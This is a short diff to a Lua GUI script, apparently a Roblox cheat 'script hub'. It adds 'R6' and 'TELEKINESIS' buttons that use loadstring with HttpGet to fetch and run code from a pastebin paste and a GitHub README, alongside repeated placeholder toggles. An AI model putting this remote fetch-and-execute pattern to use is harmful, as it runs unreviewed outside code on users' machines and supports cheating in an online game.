@@ -38,3 +38,33 @@ end,true) -- "true" is the default value of toggle
 local DisabledToggle = Section.NewToggle("Disabled Toggle",function(bool)
 -- code here
 end,false) -- "false" is the default value of toggle
+
+--// Button
+local Button = Section.NewButton("R6",function()
+loadstring(game:HttpGet("https://pastebin.com/raw/sj8uNMEK",true))()
+end)
+
+
+--//Toggles
+local EnabledToggle = Section.NewToggle("Enabled Toggle",function(bool)
+-- code here
+end,true) -- "true" is the default value of toggle
+
+local DisabledToggle = Section.NewToggle("Disabled Toggle",function(bool)
+-- code here
+end,false) -- "false" is the default value of toggle
+
+--// Button
+local Button = Section.NewButton("TELEKINESIS",function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/SAZXHUB/Control-update/main/README.md'),true))()
+end)
+
+
+--//Toggles
+local EnabledToggle = Section.NewToggle("Enabled Toggle",function(bool)
+-- code here
+end,true) -- "true" is the default value of toggle
+
+local DisabledToggle = Section.NewToggle("Disabled Toggle",function(bool)
+-- code here
+end,false) -- "false" is the default value of toggle
